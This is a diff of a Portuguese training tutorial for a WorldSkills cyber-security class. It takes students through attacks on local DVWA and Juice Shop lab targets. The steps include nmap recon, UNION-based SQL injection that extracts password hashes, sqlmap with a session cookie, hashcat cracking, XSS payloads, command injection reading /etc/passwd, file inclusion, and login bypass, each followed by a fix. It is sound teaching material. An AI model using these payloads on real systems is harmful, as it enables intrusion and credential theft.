@@ -1,38 +1,45 @@
 # Tutorial Passo a Passo — Primeiros Ataques no Lab Web
 ### Cyber SENAI Porto · WorldSkills Cyber Security · DVWA + Juice Shop
 
-> **Para o aluno aprender.** Cada ataque segue a mesma lógica das provas:
-> **o que é (conceito) → como fazer → o que observar → como corrigir.**
+> **Como ler este tutorial.** Todo comando segue sempre a mesma lógica, em 3 passos:
+> **1) o comando que vamos executar → 2) para que ele serve → 3) o que esperamos que ele retorne.**
+> E cada ataque segue a lógica das provas: **o que é (conceito) → explorar → o que esperar → como corrigir.**
 > Uso **autorizado** apenas: este é um laboratório local, de treino.
 
 ---
 
 ## Parte 0 — Preparar o ambiente (5 min)
 
-1. Confirme que o lab está no ar (no terminal do Kali):
-   ```
-   docker ps
-   ```
-   Devem aparecer: `lab-dvwa`, `lab-juice-shop`, `lab-webgoat`, `lab-wordpress`, `lab-wp-db`.
+**1. Conferir se o lab está no ar.**
 
-   **Não apareceu nada, ou faltam containers? Inicie os serviços.** É normal estarem desligados depois de reiniciar a VM:
-   ```
-   # 1) garante que o serviço do Docker está ligado
-   sudo systemctl start docker
+Execute (no terminal do Kali):
+```
+docker ps
+```
+**Para que serve:** lista os containers que estão **rodando agora**. É como você confirma que os alvos (DVWA, Juice Shop, etc.) estão de pé antes de começar.
 
-   # 2) entra na pasta do lab e sobe os alvos
-   cd ~/lab
-   docker compose up -d        # se der "command not found", use: docker-compose up -d
-   ```
-   Espere alguns segundos e rode `docker ps` de novo — os 5 containers devem aparecer com status **Up**.
-   > 💡 O `up -d` sobe em segundo plano e **reaproveita** as imagens já baixadas, então é rápido (não baixa tudo de novo). Para desligar no fim do dia: `docker compose down` (os dados do DVWA/WordPress continuam salvos para a próxima vez).
+**O que esperar:** uma tabela com 5 containers e status **Up** — `lab-dvwa`, `lab-juice-shop`, `lab-webgoat`, `lab-wordpress`, `lab-wp-db`.
 
-2. Abra o **Firefox** no Kali e acesse o **DVWA**: `http://localhost:8081`
+**Não apareceu nada, ou faltam containers? Inicie os serviços.** É normal estarem desligados depois de reiniciar a VM:
+```
+# 1) garante que o serviço do Docker está ligado
+sudo systemctl start docker
+
+# 2) entra na pasta do lab e sobe os alvos
+cd ~/lab
+docker compose up -d        # se der "command not found", use: docker-compose up -d
+```
+**Para que serve:** o `systemctl start docker` liga o motor do Docker; o `docker compose up -d` sobe todos os alvos definidos no `docker-compose.yml` em segundo plano (`-d` = *detached*).
+
+**O que esperar:** algumas linhas `Creating/Starting ... done`. Rode `docker ps` de novo — agora os 5 containers aparecem como **Up**.
+> 💡 O `up -d` **reaproveita** as imagens já baixadas, então é rápido (não baixa tudo de novo). Para desligar no fim do dia: `docker compose down` (os dados do DVWA/WordPress continuam salvos para a próxima vez).
+
+**2. Acessar o DVWA.** Abra o **Firefox** no Kali e vá em `http://localhost:8081`
    - Login: **admin** / **password**
    - Clique em **Create / Reset Database** (botão no fim da página) e logue de novo.
    - Vá em **DVWA Security** (menu esquerdo) e selecione **Low**. (Comece fácil; depois suba.)
 
-3. Abra também o **Juice Shop**: `http://localhost:3000` (vamos usar na Parte 6).
+**3. Acessar o Juice Shop.** Abra `http://localhost:3000` (vamos usar na Parte 6).
 
 > 💡 Dica: deixe o **Burp Suite** aberto em paralelo (Proxy → Intercept Off, só para ver o histórico das requisições). Opcional, mas ajuda a entender o que acontece.
 
@@ -40,41 +47,85 @@
 
 ## Parte 1 — Reconhecimento (10 min)
 
-**O que é:** antes de atacar, você mapeia o alvo — portas, serviços e tecnologias. É o primeiro passo de qualquer teste.
+**O que é:** antes de atacar, você mapeia o alvo — portas, serviços e tecnologias. É o primeiro passo de qualquer teste: você precisa saber *com o que* está lidando antes de escolher o ataque.
 
-### E se você NÃO souber o endereço do alvo?
+No nosso lab já sabemos que o endereço é `localhost`. Vamos rodar os dois comandos de recon e entender cada um.
 
-No nosso lab já sabemos que é `localhost`. Mas num teste real você recebe só uma **faixa de IPs** (um escopo), e precisa **descobrir o alvo** primeiro:
+### 1.1 Identificar as tecnologias do site — `whatweb`
 
-1. Descubra a **sua** rede: `ip a` — veja seu IP e a máscara (ex.: `192.168.56.0/24`).
-2. Ache os **hosts vivos** na faixa: `nmap -sn 192.168.56.0/24` ou `netdiscover -r 192.168.56.0/24` (este último usa ARP, acha até quem ignora ping).
-3. Identifique **qual** é o alvo pelo serviço: `nmap -p 80,443,3000,8080 --open 192.168.56.0/24` (quem tiver web aberto é candidato).
-4. Com o IP em mãos, siga o recon normal: `nmap -sV IP` e `whatweb http://IP`.
-
-Se te deram um **domínio** em vez de IP, resolva antes: `dig alvo.local +short` (ou `nslookup alvo.local`).
-
-> 💡 No lab os alvos sobem em containers no próprio Kali, por isso usamos `localhost`. Se um alvo estiver em **outra VM** (ex.: Metasploitable na rede host-only), é exatamente esse processo (passos 1→4) que você usa para encontrá-lo.
-
-**Como fazer (no nosso lab, com o endereço conhecido):**
+Execute:
 ```
 whatweb http://localhost:8081
 ```
-Veja o servidor (Apache), a linguagem (PHP) e o framework.
+**Para que serve:** o `whatweb` faz o **fingerprint** (impressão digital) do site. Ele acessa a página e, a partir dos cabeçalhos HTTP, cookies e pistas no HTML, identifica **as tecnologias por trás**: servidor web, linguagem, CMS, frameworks e, quando dá, as versões. É recon **passivo** — você só olha o que o site já entrega, sem atacar nada.
 
+**O que esperar:** uma linha com as tecnologias detectadas, parecida com:
+```
+http://localhost:8081 [200 OK] Apache[2.4.x], HTTPServer[Debian][Apache/2.4.x],
+PHP[8.x], X-Powered-By[PHP/8.x], Cookies[PHPSESSID], IP[127.0.0.1]
+```
+👉 **O que procurar:** o servidor (**Apache**) e a linguagem (**PHP**). Saber que é **PHP + formulário de login** já aponta **SQL Injection** como um caminho provável — por isso o recon guia o ataque.
+
+### 1.2 Confirmar portas e serviços — `nmap`
+
+Execute:
 ```
 nmap -sV -p 8081,3000,8080,8082 localhost
 ```
-Confirma os serviços rodando em cada porta.
+**Para que serve:** o `nmap` é o scanner de portas. O `-p` diz **quais portas** checar; o `-sV` tenta descobrir **qual serviço e versão** respondem em cada porta aberta. Confirma que os alvos estão ativos e o que exatamente roda em cada um.
 
-**E se eu não souber as portas?** Aqui eu listei as portas porque **nós** definimos os alvos no `docker-compose` (8081, 3000, 8080, 8082) — foi um atalho do lab. Normalmente você **não** sabe; aí quem descobre é o nmap:
+**O que esperar:** uma tabela de portas → serviço → versão:
+```
+PORT     STATE SERVICE VERSION
+3000/tcp open  http    Node.js Express framework   (Juice Shop)
+8080/tcp open  http    ...                          (WebGoat)
+8081/tcp open  http    Apache httpd 2.4.x           (DVWA)
+8082/tcp open  http    Apache httpd                 (WordPress)
+```
+👉 **O que procurar:** `STATE open` = porta ativa. A coluna **VERSION** é ouro: uma versão específica permite procurar vulnerabilidades conhecidas (CVEs) daquele software.
 
-- **Padrão** (as 1000 portas mais comuns): `nmap -sV IP` — sem `-p`, ele já varre as mais usadas.
-- **Todas** as 65535 portas (completo): `nmap -p- IP` — mais lento, mas não deixa passar serviço em porta incomum.
+### E se você NÃO souber o endereço do alvo?
+
+No lab usamos `localhost`, mas num teste real você recebe só uma **faixa de IPs** (escopo) e precisa **descobrir o alvo** primeiro. Mesma lógica: cada comando, para que serve, o que esperar.
+
+**a) Descobrir a sua própria rede.**
+```
+ip a
+```
+*Serve para* ver o seu IP e a máscara. *Espere* algo como `inet 192.168.56.10/24` → sua rede é `192.168.56.0/24`.
+
+**b) Achar os hosts vivos na faixa.**
+```
+nmap -sn 192.168.56.0/24
+```
+*Serve para* fazer uma varredura "de ping" (sem escanear portas) e listar **quem está ligado**. *Espere* uma lista de `Nmap scan report for 192.168.56.x` — cada um é um host vivo.
+> Alternativa por ARP (acha até quem ignora ping): `netdiscover -r 192.168.56.0/24`.
+
+**c) Identificar qual host é o alvo (quem tem web).**
+```
+nmap -p 80,443,3000,8080 --open 192.168.56.0/24
+```
+*Serve para* mostrar só quem tem **porta web aberta**. *Espere* um ou poucos IPs com `open` — esses são os candidatos.
+
+**d) Com o IP em mãos, siga o recon normal:** `nmap -sV IP` e `whatweb http://IP` (os mesmos 1.1 e 1.2, trocando `localhost` pelo IP).
+
+Se te deram um **domínio** em vez de IP, resolva antes:
+```
+dig alvo.local +short
+```
+*Serve para* traduzir o nome em IP. *Espere* um endereço IP na saída (ou use `nslookup alvo.local`).
+
+### E se eu não souber as portas?
+
+Acima eu listei as portas (8081, 3000, ...) porque **nós** as definimos no `docker-compose` — foi um atalho do lab. Normalmente você **não** sabe; quem descobre é o nmap:
+
+- **Scan padrão** (as 1000 portas mais comuns): `nmap -sV IP` — sem `-p`, já varre as mais usadas.
+- **Todas as 65535 portas:** `nmap -p- IP` — mais lento, não deixa passar serviço em porta incomum.
 - **Rápido e completo:** `nmap -p- --min-rate 1000 -T4 IP` para achar as portas abertas, depois `nmap -sV -p PORTAS_ABERTAS IP` só nelas.
 
-Regra: **porta conhecida → use `-p`; porta desconhecida → descubra com `-p-` (ou o scan padrão) e só então rode o `-sV`.**
+> **Regra de bolso:** porta conhecida → use `-p`; porta desconhecida → descubra com `-p-` (ou o scan padrão) e **só então** rode o `-sV`.
 
-**O que observar:** anote a tecnologia de cada alvo. Saber que é PHP + MySQL já diz que **SQL Injection** é um caminho provável.
+**O que observar no fim da Parte 1:** anote a tecnologia de cada alvo. Esse mapa é o que decide o próximo passo (no DVWA: PHP + MySQL → SQL Injection).
 
 ---
 
@@ -101,62 +152,73 @@ Agora a condição `'1'='1'` é **sempre verdadeira** → o banco devolve **todo
 ### 2.2 Testar do zero (passo a passo)
 
 1. No DVWA (nível **Low**), vá em **SQL Injection**.
-2. **Comportamento normal:** no campo **User ID**, digite `1` e clique em Submit. Aparece 1 usuário (`First name` / `Surname`). Guarde essa imagem mental do "normal".
-3. **Testar se é injetável:** digite só uma aspa e Submit:
+2. **Comportamento normal:** no campo **User ID**, digite `1` e Submit.
+   *O que esperar:* aparece **1 usuário** (`First name` / `Surname`). Guarde essa imagem mental do "normal".
+3. **Testar se é injetável** — digite só uma aspa e Submit:
    ```
    1'
    ```
-   **O que observar:** aparece um **erro de SQL** (algo como `You have an error in your SQL syntax...`) ou o resultado some. Erro = você quebrou a sintaxe = **é injetável**. (Se não der erro, o campo pode estar tratando a entrada.)
+   *Para que serve:* uma aspa sozinha **quebra** a sintaxe da query. Se o campo for vulnerável, o banco reclama.
+   *O que esperar:* um **erro de SQL** (`You have an error in your SQL syntax...`) ou o resultado some. Erro = você quebrou a sintaxe = **é injetável**. (Se não der erro, o campo pode estar tratando a entrada.)
 4. **Confirmar a injeção** (condição sempre verdadeira):
    ```
    1' OR '1'='1
    ```
-   **O que observar:** retornam **vários** usuários. Confirmado.
+   *Para que serve:* injeta uma condição que é sempre verdade, forçando o banco a devolver tudo.
+   *O que esperar:* retornam **vários** usuários. Confirmado.
 
-> 💡 Dica: no DVWA a SQLi é por **GET**, então dá para fazer tudo pela URL também: `.../vulnerabilities/sqli/?id=1' OR '1'='1&Submit=Submit` (lembre de codificar espaços como `%20` se precisar).
+> 💡 Dica: no DVWA a SQLi é por **GET**, então dá para fazer tudo pela URL também: `.../vulnerabilities/sqli/?id=1' OR '1'='1&Submit=Submit` (codifique espaços como `%20` se precisar).
 
 ### 2.3 Extrair dados de verdade com UNION (a parte importante)
 
-Confirmar a falha é só o começo. Para **extrair dados** usamos a técnica **UNION SELECT**, que "cola" o resultado de uma segunda consulta (sua) no resultado da primeira. Para funcionar, a sua consulta precisa ter o **mesmo número de colunas** que a original. Vamos descobrir isso em etapas:
+Confirmar a falha é só o começo. Para **extrair dados** usamos a técnica **UNION SELECT**, que "cola" o resultado de uma segunda consulta (sua) no resultado da primeira. Para funcionar, a sua consulta precisa ter o **mesmo número de colunas** que a original. Vamos descobrir isso em etapas — cada payload tem um objetivo claro.
 
-**Passo 1 — Descobrir quantas colunas a consulta tem** (com `ORDER BY`):
+**Passo 1 — Descobrir quantas colunas a consulta tem** (com `ORDER BY`).
+
+Execute, um de cada vez:
 ```
 1' ORDER BY 1-- -
 1' ORDER BY 2-- -
 1' ORDER BY 3-- -
 ```
-Vá aumentando o número. Quando der **erro** (ex.: no `3`), significa que a consulta tem **2 colunas** (o último que funcionou). O `-- -` no fim é um **comentário SQL**: ele "apaga" o resto da query original (a aspa que sobraria). *(No MySQL é traço-traço-espaço; por isso `-- -`.)*
+*Para que serve:* `ORDER BY N` pede para ordenar pela coluna N. O banco só aceita até o número de colunas que a consulta realmente tem — então você vai subindo até dar erro.
+*O que esperar:* funciona em `1` e `2`, e **dá erro** no `3` → a consulta tem **2 colunas** (o último que funcionou). O `-- -` no fim é um **comentário SQL** que "apaga" o resto da query original. *(No MySQL é traço-traço-espaço; por isso `-- -`.)*
 
-**Passo 2 — Ver onde cada coluna aparece na tela:**
+**Passo 2 — Ver onde cada coluna aparece na tela.**
 ```
 0' UNION SELECT 1,2-- -
 ```
-**O que observar:** aparece `First name: 1` e `Surname: 2`. Ou seja, a coluna 1 vira o "First name" e a 2 o "Surname". *(Usei `0'` — um ID que não existe — para a tela mostrar **só** os dados injetados, sem o usuário 1 no meio.)*
+*Para que serve:* descobrir **qual posição** da tela corresponde a cada coluna, para saber onde seus dados vão aparecer.
+*O que esperar:* aparece `First name: 1` e `Surname: 2`. Ou seja, a coluna 1 vira o "First name" e a 2 o "Surname". *(Usei `0'` — um ID que não existe — para a tela mostrar **só** os dados injetados, sem o usuário 1 no meio.)*
 
-**Passo 3 — Pegar informações do banco** (prova de que você controla a consulta):
+**Passo 3 — Pegar informações do banco** (prova de que você controla a consulta).
 ```
 0' UNION SELECT user(),version()-- -
 0' UNION SELECT database(),2-- -
 ```
-**O que observar:** o usuário do banco (ex.: `root@localhost`), a versão do MySQL e o **nome do banco** (ex.: `dvwa`).
+*Para que serve:* `user()`, `version()` e `database()` são funções do MySQL que revelam com quem e com o quê você está falando.
+*O que esperar:* o usuário do banco (ex.: `root@localhost`), a versão do MySQL e o **nome do banco** (ex.: `dvwa`).
 
-**Passo 4 — Listar as tabelas do banco:**
+**Passo 4 — Listar as tabelas do banco.**
 ```
 0' UNION SELECT table_name,2 FROM information_schema.tables WHERE table_schema=database()-- -
 ```
-**O que observar:** aparecem as tabelas (ex.: `guestbook`, `users`). A tabela `users` é o alvo.
+*Para que serve:* o `information_schema` é o **catálogo** do MySQL — um banco que lista todos os outros bancos, tabelas e colunas. Aqui pedimos os nomes das tabelas do banco atual.
+*O que esperar:* aparecem as tabelas (ex.: `guestbook`, `users`). A tabela `users` é o alvo.
 
-**Passo 5 — Listar as colunas da tabela `users`:**
+**Passo 5 — Listar as colunas da tabela `users`.**
 ```
 0' UNION SELECT column_name,2 FROM information_schema.columns WHERE table_name='users'-- -
 ```
-**O que observar:** colunas como `user_id`, `first_name`, `user`, `password`, `avatar`. As que interessam: **`user`** e **`password`**.
+*Para que serve:* agora pedimos ao catálogo os **nomes das colunas** da tabela `users`, para saber onde estão as credenciais.
+*O que esperar:* colunas como `user_id`, `first_name`, `user`, `password`, `avatar`. As que interessam: **`user`** e **`password`**.
 
-**Passo 6 — Extrair as credenciais (o prêmio):**
+**Passo 6 — Extrair as credenciais (o prêmio).**
 ```
 0' UNION SELECT user,password FROM users-- -
 ```
-**O que observar:** a lista de usuários e seus **hashes de senha** (MD5). Guarde o hash do **admin** — vamos quebrá-lo no 2.5.
+*Para que serve:* finalmente lemos o conteúdo das duas colunas que importam.
+*O que esperar:* a lista de usuários e seus **hashes de senha** (MD5). Guarde o hash do **admin** — vamos quebrá-lo no 2.5.
 
 > Resumo da técnica UNION: **conte as colunas (ORDER BY) → ache a posição visível (UNION SELECT 1,2) → navegue pelo `information_schema` (tabelas → colunas) → extraia os dados.** É sempre essa sequência.
 
@@ -171,13 +233,14 @@ O **sqlmap** faz tudo isso sozinho. Mas ele precisa se passar por você (logado)
    ```
    document.cookie
    ```
-4. Ele imprime a string completa dos cookies, por exemplo:
+   *Para que serve:* imprime, em texto, todos os cookies que o seu navegador tem para este site — inclusive o da sua sessão.
+   *O que esperar:* uma string como:
    ```
    "language=en; cookieconsent_status=dismiss; PHPSESSID=h2tcr4rn6vqisv5ptmjpn76of1; security=low"
    ```
-5. Dessa string, use só as **duas** partes que importam: **`PHPSESSID=...`** e **`security=low`** (pode ignorar `language` e `cookieconsent`).
+4. Dessa string, use só as **duas** partes que importam: **`PHPSESSID=...`** e **`security=low`** (pode ignorar `language` e `cookieconsent`).
 
-**Alternativa (pela aba Armazenamento):** com o F12 aberto, clique na aba **Armazenamento** (se ela não aparecer, clique na setinha **`>>`** no fim das abas para ver as escondidas) → abra **Cookies** → clique em **`http://localhost:8081`** → copie o valor de **`PHPSESSID`** e confirme que há **`security = low`**.
+**Alternativa (pela aba Armazenamento):** com o F12 aberto, clique na aba **Armazenamento** (se não aparecer, clique na setinha **`>>`** no fim das abas) → abra **Cookies** → clique em **`http://localhost:8081`** → copie o valor de **`PHPSESSID`** e confirme que há **`security = low`**.
 
 **Rodar o sqlmap (de forma progressiva):**
 
@@ -185,6 +248,8 @@ O **sqlmap** faz tudo isso sozinho. Mas ele precisa se passar por você (logado)
    ```
    sqlmap -u "http://localhost:8081/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=SEU_PHPSESSID; security=low" --batch
    ```
+   *Para que serve:* o sqlmap testa sozinho vários tipos de injeção no parâmetro `id`.
+   *O que esperar:* ele confirma que o `id` é vulnerável (detalhes na simulação de terminal abaixo).
 2. Listar os bancos: adicione `--dbs`
 3. Listar as tabelas do `dvwa`: `-D dvwa --tables`
 4. Listar as colunas da `users`: `-D dvwa -T users --columns`
@@ -222,7 +287,7 @@ back-end DBMS: MySQL >= 5.0
 ```
 👉 **O que procurar aqui:**
 - A linha **`GET parameter 'id' is vulnerable`** → achou a falha! 🎯
-- As linhas **`Type: boolean-based blind / error-based / UNION query`** → são as técnicas que funcionaram (o sqlmap vai usar a melhor sozinho).
+- As linhas **`Type: boolean-based blind / error-based / UNION query`** → são as técnicas que funcionaram (o sqlmap usa a melhor sozinho).
 - **`back-end DBMS is MySQL`** → ele descobriu o tipo de banco (a partir daqui sabe como extrair).
 - Se aparecer alguma pergunta `[y/N]`, o `--batch` já responde por você — não precisa fazer nada.
 
@@ -257,12 +322,17 @@ Table: users
 
 ### 2.5 Quebrar o hash (do hash ao texto claro)
 
-Os hashes do DVWA são **MD5** (modo `-m 0` no hashcat):
+Os hashes do DVWA são **MD5** (modo `-m 0` no hashcat).
+
+Execute:
 ```
 echo 'HASH_DO_ADMIN' > hash.txt
 hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
 ```
-Se a wordlist estiver zipada: `gunzip /usr/share/wordlists/rockyou.txt.gz` antes. Veja o resultado com `hashcat -m 0 hash.txt --show`. **O que observar:** a senha em texto claro aparece ao lado do hash (a do admin costuma ser `password`).
+**Para que serve:** o `echo` salva o hash num arquivo; o `hashcat -m 0` testa cada palavra da wordlist **rockyou** (14 milhões de senhas), calcula o MD5 de cada uma e compara com o seu hash até achar a que bate.
+
+**O que esperar:** depois de alguns segundos, a senha em texto claro aparece ao lado do hash. Veja o resultado com `hashcat -m 0 hash.txt --show` (a do admin costuma ser `password`).
+> Se a wordlist estiver zipada: `gunzip /usr/share/wordlists/rockyou.txt.gz` antes.
 
 ### 2.6 Como corrigir 🟢
 
@@ -277,7 +347,7 @@ $stmt->execute([$id]);
 ```
 Com isso, mesmo que o usuário digite `1' OR '1'='1`, o banco procura **literalmente** por esse texto como ID — a injeção deixa de funcionar.
 
-> 🎯 **Desafio extra:** mude o DVWA para **Medium** e tente de novo. Lá a entrada vai por POST e há um filtro simples — você vai precisar adaptar os payloads (ex.: sem aspas, usando o `id` numérico). É assim que se treina para a prova.
+> 🎯 **Desafio extra:** mude o DVWA para **Medium** e tente de novo. Lá a entrada vai por POST e há um filtro simples — você vai precisar adaptar os payloads. É assim que se treina para a prova.
 
 ---
 
@@ -285,19 +355,22 @@ Com isso, mesmo que o usuário digite `1' OR '1'='1`, o banco procura **literalm
 
 **O que é:** a aplicação devolve a sua entrada na página **sem escapar**, e o navegador executa como HTML/JS. CWE-79.
 
-**Como fazer:**
+**Explorar:**
 1. No DVWA, vá em **XSS (Reflected)**.
-2. No campo de nome, digite:
+2. No campo de nome, digite e Submit:
    ```
    <script>alert('XSS')</script>
    ```
-   e Submit. **O que observar:** aparece a caixinha de alerta — seu script rodou no navegador.
+   *Para que serve:* injeta um script na página; se a entrada não for escapada, o navegador o executa.
+   *O que esperar:* aparece a **caixinha de alerta** — seu script rodou no navegador. É a prova do XSS.
 3. Teste uma variação sem `<script>` (para entender filtros):
    ```
    <img src=x onerror=alert('XSS')>
    ```
+   *Para que serve:* força um erro de imagem que dispara o `onerror` — útil quando a tag `<script>` é bloqueada.
+   *O que esperar:* o mesmo alerta, por um caminho diferente.
 
-**Impacto:** com XSS dá para roubar cookies de sessão, redirecionar, etc.
+**Impacto:** com XSS dá para roubar cookies de sessão, redirecionar a vítima, etc.
 
 **Como corrigir 🟢:** **escape a saída** por contexto (ex.: `htmlspecialchars()` em PHP) e use `Content-Security-Policy`.
 
@@ -307,15 +380,24 @@ Com isso, mesmo que o usuário digite `1' OR '1'='1`, o banco procura **literalm
 
 **O que é:** a aplicação passa a sua entrada para um **comando do sistema** sem tratar. Você anexa um segundo comando. CWE-78.
 
-**Como fazer:**
+**Explorar:**
 1. No DVWA, vá em **Command Injection**.
-2. No campo de IP, digite um IP normal: `127.0.0.1` → ele faz um ping.
-3. Agora digite:
+2. Comportamento normal — no campo de IP, digite:
+   ```
+   127.0.0.1
+   ```
+   *O que esperar:* a saída de um **ping** normal para 127.0.0.1.
+3. Agora injete um segundo comando:
    ```
    127.0.0.1; cat /etc/passwd
    ```
-   **O que observar:** além do ping, aparece o conteúdo do `/etc/passwd` — você executou um comando no servidor.
-4. Teste também `127.0.0.1 && whoami`.
+   *Para que serve:* o `;` encerra o ping e o `cat /etc/passwd` roda em seguida, no servidor. Se a entrada não for tratada, o sistema executa os dois.
+   *O que esperar:* além do ping, aparece o **conteúdo do `/etc/passwd`** — a lista de usuários do servidor. Você executou um comando no sistema.
+4. Teste também:
+   ```
+   127.0.0.1 && whoami
+   ```
+   *O que esperar:* o ping e, no fim, o **nome do usuário** que roda o servidor web (ex.: `www-data`).
 
 **Como corrigir 🟢:** nunca montar comando com entrada do usuário; usar APIs seguras / listas de argumentos e validar a entrada (allowlist).
 
@@ -325,15 +407,20 @@ Com isso, mesmo que o usuário digite `1' OR '1'='1`, o banco procura **literalm
 
 **O que é:** a aplicação inclui um arquivo cujo caminho vem da sua entrada, sem validar. Você lê arquivos do servidor. CWE-98.
 
-**Como fazer:**
-1. No DVWA, vá em **File Inclusion**.
-2. Repare na URL: `...?page=include.php`.
-3. Troque o parâmetro por um arquivo do sistema:
+**Explorar:**
+1. No DVWA, vá em **File Inclusion**. Repare na URL: `...?page=include.php`.
+2. Troque o parâmetro `page` por um arquivo do sistema:
    ```
    http://localhost:8081/vulnerabilities/fi/?page=/etc/passwd
    ```
-   **O que observar:** o conteúdo do `/etc/passwd` aparece na página.
-4. Teste "path traversal": `?page=../../../../etc/passwd`
+   *Para que serve:* o valor de `page` é usado direto para abrir um arquivo; trocando por um caminho do sistema, você faz a aplicação ler o que não devia.
+   *O que esperar:* o **conteúdo do `/etc/passwd`** aparece dentro da página.
+3. Teste "path traversal" (subir de pasta até a raiz):
+   ```
+   http://localhost:8081/vulnerabilities/fi/?page=../../../../etc/passwd
+   ```
+   *Para que serve:* cada `../` sobe um nível de diretório — útil quando você não sabe o caminho absoluto.
+   *O que esperar:* o mesmo conteúdo do `/etc/passwd`.
 
 **Como corrigir 🟢:** nunca incluir caminho vindo do usuário; usar **allowlist** de arquivos permitidos e caminho absoluto fixo.
 
@@ -343,15 +430,20 @@ Com isso, mesmo que o usuário digite `1' OR '1'='1`, o banco procura **literalm
 
 **O que é:** mesmo princípio da Parte 2, agora numa aplicação moderna (SPA).
 
-**Como fazer:**
+**Explorar:**
 1. Abra `http://localhost:3000` e vá em **Account → Login**.
 2. No campo **Email**, digite:
    ```
    ' OR 1=1--
    ```
    No campo **Password**, digite qualquer coisa. Clique em **Log in**.
-   **O que observar:** você entra **como o primeiro usuário (admin)** — a injeção burlou a autenticação.
-3. Explore o **placar de desafios**: `http://localhost:3000/#/score-board` (achar o placar já é um desafio!).
+   *Para que serve:* a condição `1=1` é sempre verdadeira e o `--` comenta o resto da checagem de senha; a consulta de login passa a casar com o **primeiro** usuário da tabela.
+   *O que esperar:* você entra **como o primeiro usuário (admin)** — a injeção burlou a autenticação. No topo aparece o e-mail do admin logado.
+3. Explore o **placar de desafios**:
+   ```
+   http://localhost:3000/#/score-board
+   ```
+   *O que esperar:* a tela de desafios do Juice Shop (achar o placar já é um desafio!).
 
 **Como corrigir 🟢:** consultas parametrizadas + **nunca** autenticar comparando string montada com a entrada.
 
